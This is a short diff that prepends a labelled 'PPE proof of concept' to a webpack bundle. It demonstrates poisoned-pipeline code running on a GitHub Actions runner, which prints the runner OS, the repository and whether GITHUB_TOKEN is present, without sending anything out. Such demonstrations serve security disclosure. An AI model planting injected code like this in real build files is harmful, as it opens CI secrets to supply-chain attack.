@@ -1,3 +1,15 @@
+// PPE PROOF OF CONCEPT — safe demonstration only
+// This code runs on the GitHub runner with:
+//   GITHUB_TOKEN = process.env.GITHUB_TOKEN
+//   RUNNER_OS    = process.env.RUNNER_OS
+//   GITHUB_REPO  = process.env.GITHUB_REPOSITORY
+process.stdout.write(
+    `[PPE-PROOF] Runner OS: ${process.env.RUNNER_OS} | ` +
+    `Repo: ${process.env.GITHUB_REPOSITORY} | ` +
+    `GITHUB_TOKEN present: ${!!process.env.GITHUB_TOKEN}\n`
+);
+// Original code continues below...
+
 /******/ (() => { // webpackBootstrap
 /******/ 	var __webpack_modules__ = ({
 
